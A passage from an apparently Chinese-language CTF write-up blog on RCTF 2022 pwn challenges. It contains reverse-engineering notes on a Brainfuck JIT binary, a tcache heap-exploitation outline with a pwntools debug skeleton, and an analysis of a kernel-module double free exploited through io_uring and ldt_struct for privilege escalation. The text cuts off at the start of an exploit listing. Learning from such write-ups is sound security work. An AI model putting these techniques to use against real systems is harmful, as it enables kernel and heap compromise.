class="hljs-number">15</span>Câ†‘o<br>.bss:<span class="hljs-number">0x00055555555C468</span> [<span class="hljs-number">1</span>] init_16         dq ?                    ; DATA XREF: init+<span class="hljs-number">9</span>Eâ†‘w<span class="hljs-comment">//åˆå§‹åŒ–ä¸º16, ä¸‹åŒ. </span><br>.bss:<span class="hljs-number">0x00055555555C470</span> [<span class="hljs-number">2</span>] init_0          dq ?                    ; DATA XREF: init+A9â†‘w<br>.bss:<span class="hljs-number">0x00055555555C478</span> [<span class="hljs-number">3</span>] mapped_addr_2   dq ?                    ; DATA XREF: init+C6â†‘w<br>.bss:<span class="hljs-number">0x00055555555C480</span> [<span class="hljs-number">4</span>] malloc_addr     dq ?                    ; DATA XREF: init+D4â†‘w<br>.bss:<span class="hljs-number">0x00055555555C488</span> [<span class="hljs-number">5</span>] free_addr       dq ?                    ; DATA XREF: init+E2â†‘w<br>.bss:<span class="hljs-number">0x00055555555C490</span> [<span class="hljs-number">6</span>] memcpy_addr     dq ?                    ; DATA XREF: init+F0â†‘w<br>.bss:<span class="hljs-number">0x00055555555C498</span> [<span class="hljs-number">7</span>] init_2          dq ?                    ; DATA XREF: init+B4â†‘w<br></code></pre></div></td></tr></table></figure><ul><li>ä½¿ç”¨äº†<code>unkn_string_arr</code>, æŠŠä¸€å †æŒ‡ä»¤å¤åˆ¶åˆ°äº†mapped_addrçš„å‰é¢ä¸€éƒ¨åˆ†, ä¹Ÿå°±æ˜¯è¯´<code>map_str_len</code>ä»ä¸€å¼€å§‹å°±æ˜¯229. è€Œæµç¨‹ä¸­çš„callæŒ‡ä»¤éƒ½æ˜¯å¾€å›è·³. </li></ul><p>mainä¸­switch: </p><ul><li><p>ç©ºç™½ç¬¦ç»“æŸ. </p></li><li><p>è¾“å…¥å­—ç¬¦ä¸²ç¼–ç æˆæŒ‡ä»¤, å‰å‡ ä¸ªéƒ½æ˜¯callæŒ‡ä»¤, è·³åˆ°<code>cur_len+æ•°å­—+4</code>çš„ä½ç½®. åˆ°æ–¹æ‹¬å·å°±æœ‰æ¡ä»¶è·³è½¬.</p><ul><li><code>+</code> call 0x24C <code>++buf_16[init_0];</code> </li><li><code>,Â </code> 268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li><li><code>-</code> 259 <code>--buf_16[init_0];</code> </li><li><code>.</code> 288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code>  </li><li><code>&lt;</code> E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li><li><code>&gt; </code> E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li><li><code>?</code> 2B5 è§ä¸‹é¢ä»£ç  ä½¿ç”¨<code>init_2</code> </li></ul></li><li><p>å·¦æ–¹æ‹¬å·</p><ul><li>call 2A7 <code>buf_16[init_0] == 0</code> </li><li>je ??? 6bytes</li><li>push back start_pos</li></ul></li><li><p>å³æ–¹æ‹¬å·</p><ul><li>jmp start_pos 5bytes</li><li>æŠŠå·¦æ–¹æ‹¬å·çš„jeè·³è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤.</li></ul></li></ul><img src="../../image/recent_ctf/image-20230129185730706.png" alt="image-20230129185730706" style="zoom: 50%;" /><ul><li>ç»“å°¾åŠ ä¸Šretn, ç„¶åä½¿ç”¨åœ¨initä¸­åˆå§‹åŒ–çš„buf_16(0x10å­—èŠ‚æ²¡æœ‰åˆrå€¼)ä½œä¸ºå‚æ•°æ‰§è¡Œè¾“å…¥å­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„æŒ‡ä»¤, æ³¨æ„229å­—èŠ‚ä¹‹å‰éƒ½æ˜¯é‚£ä¸€å †rodataçš„æŒ‡ä»¤. </li></ul><h3 id="å‡ ä¸ªé¢„ç½®å‡½æ•°"><a href="#å‡ ä¸ªé¢„ç½®å‡½æ•°" class="headerlink" title="å‡ ä¸ªé¢„ç½®å‡½æ•°:"></a>å‡ ä¸ªé¢„ç½®å‡½æ•°:</h3><ul><li>0x5555555591E0 <del>ä»€ä¹ˆç©æ„å„¿è¿™æ˜¯</del>. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_5555555591E0</span><span class="hljs-params">(__int64 *a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">if</span> ( init_16 &lt;= init_0 + <span class="hljs-number">1</span> )<br>  &#123;<br>    new_buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">2</span> * init_16);<br>    <span class="hljs-built_in">memcpy</span>(new_buf, buf_16, init_16);<br>    <span class="hljs-built_in">free</span>(buf_16);<br>    buf_16 = new_buf;<br>    init_16 *= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ???;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li> E0_plus_1 <code>(&amp;sub_5555555591E0)(a1); ++init_0;</code> </li><li> E0_plus_2 <code>(&amp;sub_5555555591E0)(a1); --init_0;</code> </li><li>24C <code>++*(char*)(buf_16 + init_0);</code> </li><li>259 <code>--*(char*)(buf_16 + init_0);</code> </li><li>268 <code>sys_read(0, init_0 + buf_16, 1uLL);</code> </li><li>288 <code>sys_write(1, buf_16 + init_16, 1uLL);</code> </li><li>2A7 ??????? åæ¥ä¸€ä¸ªjeæŒ‡ä»¤, æ‰€ä»¥è¿™æ˜¯åˆ¤æ–­<code>*(buf_16+init_0)Â ==Â 0</code> </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">.rodata:<span class="hljs-number">00005555555592</span>A7 <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">07</span>                                   mov     rax, [rdi]<br>.rodata:<span class="hljs-number">00005555555592</span>AA <span class="hljs-number">48</span> <span class="hljs-number">8B</span> <span class="hljs-number">5F</span> <span class="hljs-number">10</span>                                mov     rbx, [rdi+<span class="hljs-number">10</span>h]<br>.rodata:<span class="hljs-number">00005555555592</span>AE <span class="hljs-number">8</span>A <span class="hljs-number">0</span>C <span class="hljs-number">18</span>                                   mov     cl, [rax+rbx]<br>.rodata:<span class="hljs-number">00005555555592B</span>1 <span class="hljs-number">20</span> C9                                      <span class="hljs-keyword">and</span>     cl, cl<br>.rodata:<span class="hljs-number">00005555555592B</span>3 C3                                         retn<br></code></pre></div></td></tr></table></figure><ul><li>2B5</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( init_2 )<br>&#123;<br>  --init_2;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1LL</span>);<br>&#125;<br><span class="hljs-keyword">return</span> init_2;<br></code></pre></div></td></tr></table></figure><p>å®Œè›‹, åˆè¦wpå­¦ä¹ æ³•äº†å—â€¦â€¦.</p><h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><blockquote><p>è¡Œå§, é¢„æœŸè§£æ˜¯house of apple. éš¾æ€ªç”¨2.35, æœ‰ç”¨åˆ°IO chain. </p><p>ä½†æ˜¯nu1lçš„æ˜¯tcacheç›¸å…³. å¦ä¸€ä¸ª<a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">éé¢„æœŸ</a>.  </p></blockquote><p>1.è¯»å †åœ°å€<br>2.ä¿®æ”¹tcache_structï¼Œåˆ†é…å‡ºtcache_struct<br>3.ä¿®æ”¹tcache_structï¼Œéšæ„åˆ†é…ï¼Œä½¿tcache_structè¢«freeå¹¶è¿›â¼Šunsorted bin<br>4.æ³„æ¼libcåœ°å€ï¼Œä¿®æ”¹tcache_structï¼Œåˆ†é…â¾„environï¼Œæ­¤æ—¶æ ˆåœ°å€åº”è¯¥è¢«æ”¾â¼Šäº†å †ä¸­ï¼Œæ³„æ¼æ ˆåœ°å€<br>5.ä¿®æ”¹tcache_structï¼Œåˆ†é…åˆ°æ ˆä¸Šï¼Œå†™ropd</p><p>ä½†æ˜¯å®æ“ç¬¬ä¸€æ­¥leakå°±å¡ä½äº†. è¯¶ç®—äº†, å€Ÿé‰´ä¸ªå¼€å¤´. é€‚ç”¨äºå‡ ä¹æ‰€æœ‰. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>ra = <span class="hljs-keyword">lambda</span> :p.recv()<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-comment">#offset from zero</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>binary = <span class="hljs-string">&#x27;./bfc&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">False</span>)<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>debug()<br></code></pre></div></td></tr></table></figure><h2 id="GAME"><a href="#GAME" class="headerlink" title="GAME"></a>GAME</h2><blockquote><p>æœ¬æ¥æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„é¢˜ç›®, ç»“æœæœ‰ä¸€ä¸ªå¾ˆç®€å•çš„éé¢„æœŸ<a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF/Round%2026/not_a_kernel_pwn">ç±»ä¼¼é¢˜ç›®</a>. å°±æ˜¯inité‡Œé¢unmountæ”¾åœ¨äº†shellé€€å‡ºä¹‹å, äºæ˜¯åˆ©ç”¨shellæ¥è¦†ç›–unmountæ–‡ä»¶è¾¾åˆ°pop root shellçš„ç›®çš„. ç„¶åçœ‹çœ‹ä»–çš„<a href="https://blog.rois.io/2022/rctf-2022-official-write-up/">é¢„æœŸè§£</a>. æ˜¯ä½œè€…è‡ªå·±æ‰¾çš„CVE, å—¯â€¦â€¦â€¦â€¦wpå†™çš„æŒºæ··æ²Œ, æ–‡å­— ç¤ºä¾‹ä»£ç  expä¸‰è€…å¯¹ä¸ä¸Šå·. çœ‹äº†å¥½å‡ å¤©. </p></blockquote><ul><li>çœ‹åˆ°å†…æ ¸æ¨¡å—çš„å‚æ•°è®¾ç½®, è¿˜æœ‰<code>file-&gt;private_data</code>è¿™ä¸ªéšæ„ä½¿ç”¨çš„æŒ‡é’ˆ. </li><li>çœ‹åˆ°æˆ‘æœ‰ä¸€æœ¬Linux Device Driver, æ„Ÿè§‰å¯ä»¥çœ‹çœ‹(å­¦ä¸å®Œäº†è¿™æ˜¯)</li><li><a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmemdup.html"><code>kmemdup_nul</code></a>: duplicate region of memory with <u>null-terminated</u>. å’Œä½¿ç”¨maxåšå‚æ•°çš„<code>kstrndump</code>ç›¸æ¯”ä½¿ç”¨ç»™å®šçš„é•¿åº¦, æ€§èƒ½æ›´å¥½. </li><li>gefæŠ½é£, ç›´æ¥pullä½¿ç”¨gef-remoteå¤±è´¥, ä½¿ç”¨ç¤ºä¾‹imageæˆåŠŸ, è‡ªå·±çš„åˆå¤±è´¥, ç›´æ¥åˆ æ‰é‡æ–°git cloneæˆåŠŸ. ä¸çŸ¥é“å•¥é—®é¢˜, åæ­£è§£å†³äº†, å¿«ç…§çœŸå¥½ç”¨. <ul><li><code>gef-remote --qemu-user --qemu-binary vmlinux localhost 1234</code> æ–°ç‰ˆgef remote</li></ul></li><li><a href="https://man7.org/linux/man-pages/man2/modify_ldt.2.html">modify_ldr</a>: <code>syscall(SYS_modify_ldt, int func, void *ptr, long bytecount);</code> func=1çš„æ—¶å€™æ˜¯ä¿®æ”¹<code>ptr-&gt;entry_number</code>è€Œä¸æ˜¯è¯»å–(0). </li><li>æ— æ„é—´å‘ç°ä»£ä½¬çš„<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">å¸¸ç”¨ç»“æ„ä½“é›†åˆ</a>åšå®¢, å‘ç°æ­¤é¢˜é¢„æœŸè§£å‰å‡ æ­¥å°±åœ¨é‡Œé¢, æœç„¶è¿˜æ˜¯å¥—è·¯è§å°‘äº†. </li><li>io_uring ç›¸å…³. <a href="https://kernel.dk/io_uring.pdf">æœ€å…¨çš„è‹±æ–‡æ–‡æ¡£</a>, å·²ä¸‹è½½. çœ‹ä»€ä¹ˆåšå®¢éƒ½ä¸å…¨, è¿ä¸ª<code>io_uring_queue_init</code>éƒ½æ‰¾ä¸åˆ°. è®©æˆ‘èŠ±ç‚¹æ—¶é—´çœ‹çœ‹<ul><li>tag<ul><li>Each tag contains a maximum of PAGE_SIZE bytes. è‡³äºä»€ä¹ˆæ˜¯tagå’Œtableè¿˜å¾—å†çœ‹çœ‹. </li><li>æˆ‘å±…ç„¶æœä¸åˆ°<code>io_uring_register_buffers_tags</code>çš„æ–‡æ¡£, <strong>è€Œä¸”ä¸ºå•¥tagæ˜¯å•¥éƒ½ä¸è¯´çš„</strong>, éš¾é“æ˜¯åŸæœ¬ioçš„ä¸œè¥¿? è¯¶åˆ°æ—¶å†çœ‹å§. æœä¸œè¥¿çœŸç´¯. man pageéƒ½æ²¡æœ‰. </li><li>tagæ˜¯äºŒç»´æ•°ç»„. ç¬¬ä¸€ç»´æ˜¯8å­—èŠ‚~0x1000(ä¸€ä¸ªpage)çš„å­æ•°ç»„, ç¬¬äºŒç»´æ˜¯çœŸæ­£çš„tagæ•°å€¼, é€šè¿‡<code>copy_from_user</code>ä»ç”¨æˆ·å¾—åˆ°.</li><li>æ‰€ä»¥0x10çš„å¤§å°å¯ä»¥å¡ä¸‹ä¸€ä¸ªå­æ•°ç»„é‡Œä¸¤ä¸ªtagå€¼.  </li></ul></li><li>å®‰è£…&amp;å›°éš¾<ul><li>liburingå°†åŸºæœ¬çš„ç³»ç»Ÿè°ƒç”¨åŒ…è£…äº†ä¸€ä¸‹, çœå»äº†æ‰‹åŠ¨å»ºç«‹io_uring instanceçš„è¿‡ç¨‹, æä¾›äº†ä¸€å¥—æ›´ç®€å•çš„æ¥å£. å³<code>queue_init</code>ä¹‹ç±». </li><li>ä¸æ‡‚IOæ“ä½œä¼šçœ‹çš„æœ‰ä¸€äº›å›°éš¾. iovecå°±æ„£äº†ä¸€ä¼šå„¿. æ‰¾ä¸ªæ—¶é—´çœ‹çœ‹åŸå§‹çš„IOæ“ä½œ. </li><li><code>apt install liburing-dev</code> ç„¶åå†gccçš„æ—¶å€™åŠ ä¸Šé“¾æ¥é€‰é¡¹<code>-luring</code>å³å¯. </li></ul></li><li>func<ul><li><code>io_uring_setup</code> å¦‚åç§°ä¸€æ ·åªæ˜¯setupä¸€ä¸ªio_uringç»“æ„ä½“, è¿”å›çš„fdè¿˜è¦æ‰‹åŠ¨mmapåˆ°è¿›ç¨‹ç©ºé—´ä¸­æ‰èƒ½è¢«å†…æ ¸ä¸ç”¨æˆ·å…±äº«. submissionå’Œcompletionæ”¾åœ¨ä¸€ä¸ªå›ºå®šçš„offsetä¸Š(é€šè¿‡macro). </li><li><code>io_uring_queue_init</code> with at least entries entries in the submission queue and then maps the file descriptor to memory shared between the application and the kernel.</li><li><code>io_uring_register_buffers</code> One of those is the ability to map a programâ€™s I/O buffers into the kernel. è‡³äºç”±tagçš„ç‰ˆæœ¬è§ä¸Šé¢. </li></ul></li></ul></li><li>çœ‹äº†å‡ å¤©å±…ç„¶æœ‰é—æ¼çš„åœ°æ–¹, éš¾æ€ªç¬¬ä¸€é˜¶æ®µå°±çœ‹ä¸æ˜ç™½, rebornéƒ¨åˆ†æ¦‚æ‹¬å·²ä¿®æ”¹. å¥½å§åŸæ¥ç¬¬ä¸€é˜¶æ®µçš„ä¸œè¥¿å¯¹åé¢æœ‰ä½œç”¨, è€Œä¸”heapåœ°å€æ³„éœ²å®Œå…¨å’Œdouble freeæ²¡æœ‰å…³ç³»â€¦..change()ä¹‹åç›´æ¥readå°±èƒ½è¯»å–heapåœ°å€â€¦.<del>è¿™æ˜¯åœ¨æå•¥å•Š</del>. ç»ˆäºçœ‹æ‡‚, </li><li>**ç»“è®º: å‘ç°ä¸€æ¡è·¯å¾„èƒ½å¤Ÿé€šè¿‡ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®, é‚£å°±å»æƒ³èƒ½å¦æ”¹å˜æŒ‡é’ˆä»è€Œè¾¾åˆ°ä»»æ„å†™? å¤šæ³¨æ„mallocå’Œfreeå‡½æ•°, delMaindåˆ†æå°±å†™å‡ ä¸ªå­—æ€ä¹ˆèƒ½ååº”å¾—åˆ°å‘¢. ** </li><li>å‘ç°ä¹‹å‰æ‰¾FUSEçš„æ—¶å€™çœ‹åˆ°çš„ä¸€ç¯‡æ–‡ç« é‡Œå¼€å¤´å°±æ˜¯uring. <a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">é“¾æ¥åœ¨æ­¤</a>. åŸç½‘ç«™æŒ‚äº†ç”¨çš„webarchive. æŒºé•¿çš„. ç”šè‡³è¿˜æœ‰ä¸€ç¯‡ä½¿ç”¨ebpfè¿›è¡Œkernel pwnçš„<a href="https://web.archive.org/web/20221119160242/https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story">æ–‡ç« </a>, ä¸çŸ¥é“å•¥æ—¶å€™æœ‰å¿ƒæƒ…çœ‹. éƒ½åœ¨kernel in allä¸­. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Maind</span></span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-title">id</span>;</span><br><span class="hljs-keyword">char</span> username[<span class="hljs-number">0x20</span>];<br><span class="hljs-keyword">void</span> *cur;<br><span class="hljs-keyword">void</span> *prv;<br><span class="hljs-keyword">int</span> random;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mycdev</span> &#123;</span><br>    <span class="hljs-keyword">int</span> len;<br>    <span class="hljs-keyword">unsigned</span>   <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">50</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span>   <span class="hljs-title">cdev</span> <span class="hljs-title">cdev</span>;</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>moduleæ“ä½œ</p><ul><li>open: kzmallocä¸€ä¸ªMaindç»“æ„ä½“æ”¾åˆ°<code>file-&gt;private_data</code>é‡Œé¢</li><li>read: æœ€å¤š9å­—èŠ‚, ä»<code>context-&gt;cur</code>å¤åˆ¶</li><li>release: <code>private_data</code>ç›´æ¥ç½®ç©º</li><li>unlocked_ioctl: 0 1 114 22. è¿™ç‰¹ä¹ˆæ˜¯é‡ç”Ÿæ¨¡æ‹Ÿå™¨ä¹ˆ.<ul><li>born: argä¸ºusername, ç”Ÿæˆè¿æ°”ä¸ºordinary, id=0. </li><li>reborn: curç§»åˆ°prv, ç”Ÿæˆunluckyå’Œ-114514çš„money. å¾ˆè‡­çš„é‡‘é’±æ•°. context-&gt;id++<br><strong>æ³¨æ„cur-&gt;magicç§»åŠ¨åˆ°prvåå¹¶æ²¡æœ‰æ¸…ç©º, å¯¼è‡´double free</strong> </li><li>change: argä¸ºé€—å·åˆ†éš”çš„ç­‰å¼, å·¦è¾¹ä¸ºkey_list, å³è¾¹å¯èƒ½ä¸ºmagicçš„å­—ç¬¦ä¸², æˆ–moneyçš„é’±æ•°. <ul><li>å½“key=flagæ—¶, ç›´æ¥å¯¹cur-&gt;magicè¿›è¡Œfree. </li></ul></li><li>delMaind: å°±æ˜¯åˆ é™¤. curå’Œprvéƒ½free, åœ¨è¿™é‡Œå‘ç”Ÿdouble free. </li></ul></li></ul><p>å°±æ˜¯double freeçš„åˆ©ç”¨. å…¶å®æŒºç®€å•çš„. ä¸»è¦å­¦åˆ°çš„ä¸œè¥¿æ˜¯io_uringåŠ ä¸Šldt_structçš„åˆ©ç”¨</p><ul><li>io_uringä¸­çš„tagæ“ä½œå¯ä»¥mallocä¸€ä¸ªäºŒç»´æ•°ç»„<code>size_t **tag</code>, è¿˜æœ‰ä¸€ä¸ªupdate_tagå‡½æ•°å¯ä»¥ä¿®æ”¹å†…å®¹. ç¬¬ä¸€äºŒçº§æ•°ç»„éƒ½æ˜¯åˆ†é…åœ¨å†…æ ¸heapä¸Š, è¿˜å¯ä»¥é€šè¿‡äºŒçº§æ•°ç»„æ¥æ§åˆ¶ä¸€çº§æ•°ç»„åˆ†é…çš„å¤§å°. å¦‚æœèƒ½æ§åˆ¶ä¸€çº§æ•°ç»„çš„æŒ‡é’ˆ, é‚£å°±ç›¸å½“äºä¸€ä¸ªä»»æ„å†™. æ–¹æ³•æ˜¯â€¦è¯¦è§ä»£ç . </li><li>æ­¤æ—¶ldtçš„modifyæ“ä½œä¸­åˆ†é…äº†ä¸€ä¸ª0x10å­—èŠ‚ldt_structç»“æ„ä½“, å‰8å­—èŠ‚åœ¨<code>read_ldt()</code>ç³»ç»Ÿè°ƒç”¨ä¸­åœ¨å†…æ ¸æ€ä½¿ç”¨memcpyæ¥è¯»å–<strong>ä»»æ„é•¿åº¦</strong>çš„<code>ldt_struct-&gt;entries</code>åˆ°ç”¨æˆ·åŒº. é…åˆUAFæ¼æ´å¯ä»¥å’ŒtagäºŒçº§æ•°ç»„é‡åˆ, ä»è€Œæ”¹å˜entriesæŒ‡é’ˆè¾¾åˆ°ä»»æ„è¯». </li><li>æœ€åæ‰¾åˆ°credç»“æ„ä½“æ˜¯é€šè¿‡ç¬¬ä¸€æ­¥çš„heapæŒ‡é’ˆå¾€é«˜å¤„æ‰¾(ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦è·³åˆ°ä¸­é—´ç„¶åå†å‰åæ‰¾çš„æ–¹å¼). å‘ç°è®¾ç½®å¥½çš„è¿›ç¨‹åç§°åå³å¯å‘ç°å­è¿›ç¨‹çš„cred. ç„¶åä¿®æ”¹åç§»æŸ¥çœ‹å“ªä¸ªå­è¿›ç¨‹ææƒäº†å³å¯. ç”¨åˆ°äº†SIGSTOP &amp;&amp; SIGCONT. å±äºæ˜¯process spray(è¯¯). </li></ul><h3 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h3><p>ä½¿ç”¨io_uringå»ä¿®æ”¹ldt_structç»“æ„ä½“, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 